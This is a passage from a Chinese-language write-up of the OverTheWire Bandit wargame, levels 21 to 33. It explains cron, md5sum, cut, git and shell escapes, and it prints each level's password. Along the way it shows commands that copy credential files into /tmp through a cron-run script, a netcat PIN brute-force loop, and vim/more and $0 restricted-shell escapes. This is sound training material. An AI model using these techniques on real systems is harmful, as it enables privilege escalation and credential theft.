class="bash">每小时执行一次</span></span><br><span class="line">* */1 * * *</span><br><span class="line"><span class="meta">#</span><span class="bash">晚上11点到早上7点之间，每小时执行一次</span></span><br><span class="line">* 23-7/1 * * *</span><br><span class="line"><span class="meta">#</span><span class="bash">每月的4号与每周一到周三的11点</span></span><br><span class="line">0 11 4 * 1-3</span><br><span class="line"><span class="meta">#</span><span class="bash">一月一号的4点</span></span><br><span class="line">0 4 1 1 *</span><br></pre></td></tr></table></figure>

<p>Cron also offers some special strings, which can be used in place of the five time-and-date fields:</p>
<ul>
<li><table>
<thead>
<tr>
<th><strong>string</strong></th>
<th><strong>meaning</strong></th>
</tr>
</thead>
<tbody><tr>
<td>@reboot</td>
<td>Run once, at startup.</td>
</tr>
<tr>
<td>@yearly</td>
<td>Run once a year, “0 0 1 1 *”.</td>
</tr>
<tr>
<td>@annually</td>
<td>(same as @yearly)</td>
</tr>
<tr>
<td>@monthly</td>
<td>Run once a month, “0 0 1 * *”.</td>
</tr>
<tr>
<td>@weekly</td>
<td>Run once a week, “0 0 * * 0”.</td>
</tr>
<tr>
<td>@daily</td>
<td>Run once a day, “0 0 * * *”.</td>
</tr>
<tr>
<td>@midnight</td>
<td>(same as @daily)</td>
</tr>
<tr>
<td>@hourly</td>
<td>Run once an hour, “0 * * * *”.</td>
</tr>
</tbody></table>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bandit21@bandit:~$ <span class="built_in">cd</span> /etc/cron.d</span><br><span class="line">bandit21@bandit:/etc/cron.d$ ls</span><br><span class="line">cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24</span><br><span class="line">cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root</span><br><span class="line">bandit21@bandit:/etc/cron.d$ cat cronjob_bandit_bandit22</span><br><span class="line">cat: cronjob_bandit_bandit22: No such file or directory</span><br><span class="line">bandit21@bandit:/etc/cron.d$ cat cronjob_bandit_22</span><br><span class="line">cat: cronjob_bandit_22: No such file or directory</span><br><span class="line">bandit21@bandit:/etc/cron.d$ cat cronjob_bandit22</span><br><span class="line">@reboot bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null</span><br><span class="line">* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null</span><br><span class="line">bandit21@bandit:/etc/cron.d$ ls</span><br><span class="line">cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24</span><br><span class="line">cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root</span><br><span class="line">bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv</span><br><span class="line">cat /etc/bandit_pass/bandit22 &gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv</span><br><span class="line">bandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv</span><br><span class="line">Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI</span><br></pre></td></tr></table></figure>

<h2 id="Level-22➡Level-23"><a href="#Level-22➡Level-23" class="headerlink" title="Level_22➡Level_23"></a>Level_22➡Level_23</h2><h2 id="Learn-about-md5sum-and-command-cut"><a href="#Learn-about-md5sum-and-command-cut" class="headerlink" title="Learn about md5sum and command cut:"></a><strong>Learn about md5sum and command cut:</strong></h2><p>MD5算法常常被用来验证网络文件传输的完整性，防止文件被人篡改。MD5 全称是报文摘要算法（Message-Digest  Algorithm  5），此算法对任意长度的信息逐位进行计算，产生一个二进制长度为128位（十六进制长度就是32位）的“指纹”（或称“报文摘要”），不同的文件产生相同的报文摘要的可能性是非常非常之小的。</p>
<p>cut命令用于显示每行从开头算起 num1 到 num2 的文字。</p>
<p>cut 命令从文件的每一行剪切字节、字符和字段并将这些字节、字符和字段写至标准输出。</p>
<p>如果不指定 File 参数，cut 命令将读取标准输入。必须指定 -b、-c 或 -f 标志之一。</p>
<p>Options:</p>
<ul>
<li>-b ：以字节为单位进行分割。这些字节位置将忽略多字节字符边界，除非也指定了 -n 标志。</li>
<li>-c ：以字符为单位进行分割。</li>
<li>-d ：自定义分隔符，默认为制表符。</li>
<li>-f  ：与-d一起使用，指定显示哪个区域。</li>
<li>-n ：取消分割多字节字符。仅和 -b 标志一起使用。如果字符的最后一个字节落在由 -b 标志的 List 参数指示的<br>范围之内，该字符将被写出；否则，该字符将被排除</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bandit22@bandit:~$ <span class="built_in">cd</span> /etc/cron.d</span><br><span class="line">bandit22@bandit:/etc/cron.d$ ls</span><br><span class="line">cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24</span><br><span class="line">cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root</span><br><span class="line">bandit22@bandit:/etc/cron.d$ cat cronjob_bandit23</span><br><span class="line">@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null</span><br><span class="line">* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null</span><br><span class="line">bandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">myname=$(whoami)</span><br><span class="line">mytarget=$(<span class="built_in">echo</span> I am user <span class="variable">$myname</span> | md5sum | cut -d <span class="string">&#x27; &#x27;</span> -f 1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Copying passwordfile /etc/bandit_pass/<span class="variable">$myname</span> to /tmp/<span class="variable">$mytarget</span>&quot;</span></span><br><span class="line"></span><br><span class="line">cat /etc/bandit_pass/<span class="variable">$myname</span> &gt; /tmp/<span class="variable">$mytarget</span></span><br><span class="line">bandit22@bandit:/etc/cron.d$ whoami</span><br><span class="line">bandit22</span><br><span class="line">bandit22@bandit:/etc/cron.d$ ls -al</span><br><span class="line">total 36</span><br><span class="line">drwxr-xr-x  2 root root 4096 Jul 11  2020 .</span><br><span class="line">drwxr-xr-x 87 root root 4096 May 14  2020 ..</span><br><span class="line">-rw-r--r--  1 root root   62 May 14  2020 cronjob_bandit15_root</span><br><span class="line">-rw-r--r--  1 root root   62 Jul 11  2020 cronjob_bandit17_root</span><br><span class="line">-rw-r--r--  1 root root  120 May  7  2020 cronjob_bandit22</span><br><span class="line">-rw-r--r--  1 root root  122 May  7  2020 cronjob_bandit23</span><br><span class="line">-rw-r--r--  1 root root  120 May 14  2020 cronjob_bandit24</span><br><span class="line">-rw-r--r--  1 root root   62 May 14  2020 cronjob_bandit25_root</span><br><span class="line">-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder</span><br><span class="line">bandit22@bandit:/etc/cron.d$ <span class="built_in">echo</span> I am user bandit23| md5sum</span><br><span class="line">8ca319486bfbbc3663ea0fbe81326349  -</span><br><span class="line">bandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349</span><br><span class="line">jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n</span><br><span class="line">bandit22@bandit:/etc/cron.d$ </span><br></pre></td></tr></table></figure>

<p>Descriptions:</p>
<p>md5sum: 显示或检查 MD5(128-bit) 校验和,若没有文件选项，或者文件处为”-“，则从标准输入读取。<br>echo <strong>-n</strong> : 不打印换行符。(注意: echo -n 后面的-n参数必须加上, 这样算出的字符串的md5值才正确)<br>cut:  cut用来从标准输入或文本文件中剪切列或域。剪切文本可以将之粘贴到一个文本文件。 -d 指定与空格和tab键不同的域分隔符。-f1 表示第一个域。</p>
<h2 id="Level-23➡Level-24"><a href="#Level-23➡Level-24" class="headerlink" title="Level_23➡Level_24"></a>Level_23➡Level_24</h2><p><strong>Ez_shell_code</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">myname=$(whoami)</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /var/spool/<span class="variable">$myname</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Executing and deleting all scripts in /var/spool/<span class="variable">$myname</span>:&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> * .*;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$i</span>&quot;</span> != <span class="string">&quot;.&quot;</span> -a <span class="string">&quot;<span class="variable">$i</span>&quot;</span> != <span class="string">&quot;..&quot;</span> ];</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Handling <span class="variable">$i</span>&quot;</span></span><br><span class="line">        owner=<span class="string">&quot;<span class="subst">$(stat --format <span class="string">&quot;%U&quot;</span> ./$i)</span>&quot;</span></span><br><span class="line">        <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$&#123;owner&#125;</span>&quot;</span> = <span class="string">&quot;bandit23&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">            timeout -s 9 60 ./<span class="variable">$i</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">        rm -f ./<span class="variable">$i</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>Analyse:</p>
<p>shell脚本分析：</p>
<p>间隔时间执行/var/spool/bandit24 目录下的文件然后删除</p>
<p>我们编写个shell脚本输出即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bandit23@bandit:/var/spool/bandit24$ vim fuck.sh</span><br><span class="line">bandit23@bandit:/var/spool/bandit24$ chmod 777 fuck.sh</span><br></pre></td></tr></table></figure>

<p>fuck.sh</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /etc/bandit_pass/bandit24 &gt; /tmp/i_got_it</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">bandit23@bandit:~$ cat /tmp/i_got_it</span><br><span class="line">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ</span><br></pre></td></tr></table></figure>



<h2 id="Level-24➡Level-25"><a href="#Level-24➡Level-25" class="headerlink" title="Level_24➡Level_25"></a>Level_24➡Level_25</h2><p><strong>basic_shell</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">! /bin/bash</span></span><br><span class="line">pass24=&quot;UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ&quot;</span><br><span class="line">nc localhost 30002</span><br><span class="line">for i in &#123;0..9&#125;&#123;0..9&#125;&#123;0..9&#125;&#123;0..9&#125;</span><br><span class="line">do</span><br><span class="line">    echo $pass24&#x27; &#x27;$i &gt;&gt; dict</span><br><span class="line">done</span><br><span class="line">cat ./dict | nc localhost 30002 &gt;&gt; re</span><br><span class="line">sort re | uniq -u</span><br></pre></td></tr></table></figure>

<h2 id="Level-25➡Level-26"><a href="#Level-25➡Level-26" class="headerlink" title="Level_25➡Level_26"></a>Level_25➡Level_26</h2><p>Tips:The shell for user bandit26 is not <strong>/bin/bash</strong></p>
<p>根据提示我们查看bandit26的/etc/passwd 文件</p>
<h2 id="Learn-about-the-passwd"><a href="#Learn-about-the-passwd" class="headerlink" title="Learn about the passwd"></a><strong>Learn about the passwd</strong></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> passwd文件是以行为单位的配置文件，每行定义系统上的一个用户，行内分为字段，字段之间由一个冒号隔开。这些字段依次为：</span><br><span class="line">用户名：密码：用户ID：主要组ID：GECOS：主目录：登录shell</span><br><span class="line">字段解释：</span><br><span class="line">用户名：就是一个用户名，登录时候用的</span><br><span class="line">密码：在旧的UNIX系统上，这个字段含有用户的加密密码，为了安全性，现在的linux均显示为x或*号</span><br><span class="line">用户ID：linux内核用于识别用户的一个整数ID</span><br><span class="line">主要组ID：linux内核用于识别用户主要组的一个整数ID</span><br><span class="line">GECOS：用户全名，安装linux时如果不输入全名，则显示为跟用户名一样，如果输入，则显示为全名（不可用于登录）</span><br><span class="line">主目录：用户登录时，他的登录Shell将使用这个目录作为当前工作目录</span><br><span class="line">登录Shell：用户登录时的默认Shell，在redhat 企业版中，登录shell通常是&#x2F;bin&#x2F;bash </span><br></pre></td></tr></table></figure>

<p>Three types of users:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> 3种类型的用户</span><br><span class="line">普通用户：普通用户是使用系统真实用户人群。普通用户通常把&#x2F;bin&#x2F;bash作为登录Shell和&#x2F;home的子目录作为主目录。一般情况下，普通用户只在自己的主目录和系统范围内的临时目录里（如&#x2F;tmp和&#x2F;var&#x2F;tmp）创建文件。在redhat企业版linux中，普通用户的用户ID数通常大于500.</span><br><span class="line"> </span><br><span class="line">root用户：用户ID为0的用户，也被称为超级用户，root用户在系统上拥有完全权限，可以修改和删除任何文件，可以运行任何命令，可以取消任何进程。root用户负责增加和保留其他用户、配置硬件、添加系统软件。虽然root用户可以在系统上的任何地方创建文件，但它也通常使用&#x2F;root作为主目录</span><br><span class="line"> </span><br><span class="line">系统用户：大多数linux系统保留一系列低UID值用户作为系统用户，系统用户不代表人，而代表系统的组成部分。例如，运行Apache网络服务器的进程经常作为用户apache（ 见上面的passwd文件中apache用户信息）来运行。系统用户一般没有登录Shell，因为它不代表实际登录的用户。同样，系统用户的主目录很少在&#x2F;home中，而通常在属于相关应用的系统目录中。例如，用户apache的主目录是&#x2F;var&#x2F;www。在redhat企业版linux中，系统用户的UID值范围在1-499之间。 </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bandit25@bandit:~$ cat /etc/passwd|grep bandit26</span><br><span class="line">bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext</span><br><span class="line">bandit25@bandit:~$ cat /usr/bin/showtext</span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> TERM=linux</span><br><span class="line"></span><br><span class="line">more ~/text.txt</span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure>

<p>将命令窗口调最小自动触发more，然后修改shell为bash即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 按下v键进入vi编辑模式，然后更改shell为bash即可</span></span><br><span class="line">:<span class="built_in">set</span> shell sh=/bin/bash  <span class="comment">#vim命令设置shell</span></span><br><span class="line">:sh                      <span class="comment">#vim中执行shell</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bandit26@bandit:~$ cat /etc/bandit_pass/bandit26</span><br><span class="line">5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z</span><br></pre></td></tr></table></figure>

<h2 id="Level-26➡Level-27"><a href="#Level-26➡Level-27" class="headerlink" title="Level_26➡Level_27"></a>Level_26➡Level_27</h2><p>和上一关差不多。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">:<span class="built_in">set</span> shell=/bin/sh</span><br><span class="line">:sh</span><br></pre></td></tr></table></figure>

<p>进入后:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27</span><br><span class="line">3ba3118a22e93127a4ed485be72ef5ea</span><br></pre></td></tr></table></figure>

<h2 id="Level-27➡Level-28"><a href="#Level-27➡Level-28" class="headerlink" title="Level_27➡Level_28"></a>Level_27➡Level_28</h2><h2 id="Learn-about-Git"><a href="#Learn-about-Git" class="headerlink" title="Learn about Git"></a><strong>Learn about Git</strong></h2><p>参阅阮一峰这篇：</p>
<p><a href="https://www.liaoxuefeng.com/wiki/896043488029600">clink_me</a></p>
<p>git clone 克隆一个项目：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bandit27@bandit:/tmp/what_a_fuck$ git <span class="built_in">clone</span> ssh://bandit27-git@localhost/home/bandit27-git/repo</span><br><span class="line">bandit27@bandit:/tmp/what_a_fuck$ ls</span><br><span class="line">repo</span><br><span class="line">bandit27@bandit:/tmp/what_a_fuck$ <span class="built_in">cd</span> repo/</span><br><span class="line">bandit27@bandit:/tmp/what_a_fuck/repo$ ls</span><br><span class="line">README</span><br><span class="line">bandit27@bandit:/tmp/what_a_fuck/repo$ cat README</span><br><span class="line">The password to the next level is: 0ef186ac70e04ea33b4c1853d2526fa2</span><br></pre></td></tr></table></figure>

<h2 id="Level-28➡Level-29"><a href="#Level-28➡Level-29" class="headerlink" title="Level_28➡Level_29"></a>Level_28➡Level_29</h2><p>和上一关差不多，但并没有直接给flag，可以利用git log 命令查看修改信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bandit28@bandit:/tmp/what_a_fuck/repo$ git <span class="built_in">log</span></span><br><span class="line">commit edd935d60906b33f0619605abd1689808ccdd5ee</span><br><span class="line">Author: Morla Porla &lt;morla@overthewire.org&gt;</span><br><span class="line">Date:   Thu May 7 20:14:49 2020 +0200</span><br><span class="line"></span><br><span class="line">    fix info leak   <span class="comment">#修复信息泄露</span></span><br><span class="line"></span><br><span class="line">commit c086d11a00c0648d095d04c089786efef5e01264</span><br><span class="line">Author: Morla Porla &lt;morla@overthewire.org&gt;</span><br><span class="line">Date:   Thu May 7 20:14:49 2020 +0200</span><br><span class="line"></span><br><span class="line">    add missing data <span class="comment">#添加缺少的信息</span></span><br><span class="line"></span><br><span class="line">commit de2ebe2d5fd1598cd547f4d56247e053be3fdc38</span><br><span class="line">Author: Ben Dover &lt;noone@overthewire.org&gt;</span><br><span class="line">Date:   Thu May 7 20:14:49 2020 +0200</span><br><span class="line"></span><br><span class="line">    initial commit of README.md <span class="comment">#最初的信息</span></span><br></pre></td></tr></table></figure>

<p>很明显比较修复信息泄露的提交和上一个提交即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bandit28@bandit:/tmp/what_a_fuck/repo$ git diff  c086 edd9</span><br><span class="line">diff --git a/README.md b/README.md</span><br><span class="line">index 3f7cee8..5c6457b 100644</span><br><span class="line">--- a/README.md</span><br><span class="line">+++ b/README.md</span><br><span class="line">@@ -4,5 +4,5 @@ Some notes <span class="keyword">for</span> level29 of bandit.</span><br><span class="line"> <span class="comment">## credentials</span></span><br><span class="line"> </span><br><span class="line"> - username: bandit29</span><br><span class="line">-- password: bbc96594b4e001778eee9975372716b2</span><br><span class="line">+- password: xxxxxxxxxx</span><br></pre></td></tr></table></figure>

<h2 id="Level-29➡Level-30"><a href="#Level-29➡Level-30" class="headerlink" title="Level_29➡Level_30"></a>Level_29➡Level_30</h2><h2 id="Learn-about-branch-of-git"><a href="#Learn-about-branch-of-git" class="headerlink" title="Learn about branch of git:"></a>Learn about <strong>branch</strong> of git:</h2><p>官方文档：<a href="https://git-scm.com/book/en/v2/Git-Branching-Branches-in-a-Nutshell">yyds</a></p>
<p>:)阅读官方文档的时候英语的作用就体现出来了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bandit29@bandit:/tmp/what_a_fuck/repo$ git branch -a   <span class="comment">#查看所有分支</span></span><br><span class="line">* master</span><br><span class="line">  remotes/origin/HEAD -&gt; origin/master</span><br><span class="line">  remotes/origin/dev</span><br><span class="line">  remotes/origin/master</span><br><span class="line">  remotes/origin/sploits-dev</span><br><span class="line">bandit29@bandit:/tmp/what_a_fuck/repo$ git checkout dev <span class="comment">#切换到其他分支</span></span><br><span class="line">Switched to branch <span class="string">&#x27;dev&#x27;</span></span><br><span class="line">bandit29@bandit:/tmp/what_a_fuck/repo$ git <span class="built_in">log</span></span><br><span class="line">commit bc833286fca18a3948aec989f7025e23ffc16c07</span><br><span class="line">Author: Morla Porla &lt;morla@overthewire.org&gt;</span><br><span class="line">Date:   Thu May 7 20:14:52 2020 +0200</span><br><span class="line"></span><br><span class="line">    add data needed <span class="keyword">for</span> development        <span class="comment">#该分支下可能有flag</span></span><br><span class="line"></span><br><span class="line">commit 8e6c203f885bd4cd77602f8b9a9ea479929ffa57</span><br><span class="line">Author: Ben Dover &lt;noone@overthewire.org&gt;</span><br><span class="line">Date:   Thu May 7 20:14:51 2020 +0200</span><br><span class="line"></span><br><span class="line">    add gif2ascii</span><br><span class="line"></span><br><span class="line">commit 208f463b5b3992906eabf23c562eda3277fea912</span><br><span class="line">Author: Ben Dover &lt;noone@overthewire.org&gt;</span><br><span class="line">Date:   Thu May 7 20:14:51 2020 +0200</span><br><span class="line"></span><br><span class="line">    fix username</span><br><span class="line"></span><br><span class="line">commit 18a6fd6d5ef7f0874bbdda2fa0d77b3b81fd63f7</span><br><span class="line">Author: Ben Dover &lt;noone@overthewire.org&gt;</span><br><span class="line">Date:   Thu May 7 20:14:51 2020 +0200</span><br><span class="line"></span><br><span class="line">    initial commit of README.md</span><br><span class="line">bandit29@bandit:/tmp/what_a_fuck/repo$ cat README.md <span class="comment">#查看READM.md</span></span><br><span class="line"><span class="comment"># Bandit Notes</span></span><br><span class="line">Some notes <span class="keyword">for</span> bandit30 of bandit.</span><br><span class="line"></span><br><span class="line"><span class="comment">## credentials</span></span><br><span class="line"></span><br><span class="line">- username: bandit30</span><br><span class="line">- password: 5b90576bedb2cc04c86a9e924ce42faf</span><br></pre></td></tr></table></figure>

<h2 id="Level-30➡Level-31"><a href="#Level-30➡Level-31" class="headerlink" title="Level_30➡Level_31"></a>Level_30➡Level_31</h2><h2 id="Learn-about-the-git-show"><a href="#Learn-about-the-git-show" class="headerlink" title="Learn about the git show"></a><strong>Learn about the git show</strong></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git show-ref <span class="comment">#显示所有本地库储存的所有可能的引用以及关联的提醒</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">3aa4c239f729b07deb99a52f125893e162daac9e refs/heads/master</span><br><span class="line">3aa4c239f729b07deb99a52f125893e162daac9e refs/remotes/origin/HEAD</span><br><span class="line">3aa4c239f729b07deb99a52f125893e162daac9e refs/remotes/origin/master</span><br><span class="line">f17132340e8ee6c159e0a4a6bc6f80e1da3b1aea refs/tags/secret</span><br><span class="line">git show f171即可get flag</span><br><span class="line">47e603bb428404d265f59c42920d81e5</span><br></pre></td></tr></table></figure>

<h2 id="Level-31➡Level-32"><a href="#Level-31➡Level-32" class="headerlink" title="Level_31➡Level_32"></a>Level_31➡Level_32</h2><h2 id="Learn-about-push-and-commit-of-git"><a href="#Learn-about-push-and-commit-of-git" class="headerlink" title="Learn about  push and commit of git"></a><strong>Learn about  push and commit of git</strong></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bandit31@bandit:/tmp/sanshiyiguan/repo$ cat README.md </span><br><span class="line">This time your task is to push a file to the remote repository.</span><br><span class="line"></span><br><span class="line">Details:</span><br><span class="line">    File name: key.txt</span><br><span class="line">    Content: <span class="string">&#x27;May I come in?&#x27;</span></span><br><span class="line">    Branch: master</span><br></pre></td></tr></table></figure>

<p>查看信息应该是让我们用master分支把包含’May I come in?’的key.txt提交到远程仓库</p>
<p>vim 编辑该文档然后添加</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git add key.txt -f</span><br></pre></td></tr></table></figure>

<p>关于 <a href="https://git-scm.com/docs/git-commit">commit</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git commit -m  <span class="string">&quot;wuhu~I_got_it&quot;</span></span><br></pre></td></tr></table></figure>

<p>The last step:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git push</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">remote: Well done! Here is the password for the next level:</span><br><span class="line">remote: 56a9bf19c63d650ce78e6ec0354ee45e</span><br></pre></td></tr></table></figure>

<h2 id="Level-32➡Level-33"><a href="#Level-32➡Level-33" class="headerlink" title="Level_32➡Level_33"></a>Level_32➡Level_33</h2><p>Analyse:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt; ls</span><br><span class="line">sh: 1: LS: not found</span><br><span class="line">&gt;&gt; whoami</span><br><span class="line">sh: 1: WHOAMI: not found</span><br></pre></td></tr></table></figure>

<p>登录后弹出一个大写的SHELL终端，测试发现我们所有的命令都会被转换为大写。</p>
<p>根据Tips: sh 和 man 查阅man sh文档 找到了一些信息，可以用$0</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Expands to the name of the shell or shell script.  </span><br><span class="line">This is set at shell initialization.  </span><br><span class="line">If bash is invoked with a file of commands, $0 is set  to  the  name  of that file.  </span><br><span class="line">If bash is started with the -c option, then $0 is set to the first argument after the string to be executed, if one is present. </span><br><span class="line">Otherwise, it is set to the file name used to invoke bash, as given by argument zero.</span><br></pre></td></tr></table></figure>

<h2 id="What’s-0"><a href="#What’s-0" class="headerlink" title="What’s  $0"></a><strong>What’s  $0</strong></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">In bash, $n (where “n” represents a number), refers to the nth argument of a command call. $1 would be the first parameter, $2 the second, and so forth. $0 refers to the command itself. As we figured out above that our input is passed on to an sh call, $0 will be referencing sh itself, starting a new shell (without the UPPERCASE mechanics).</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat /etc/bandit_pass/bandit33</span><br><span class="line">c9c3199ddf4121b10cf581a98d51caee</span><br></pre></td></tr></table></figure>



<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><strong>Summary</strong></h2><p>题目非常平易近人，引导着学习基本Linux命令、linux文件、用户管理等、Git命令等知识。</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
</search>
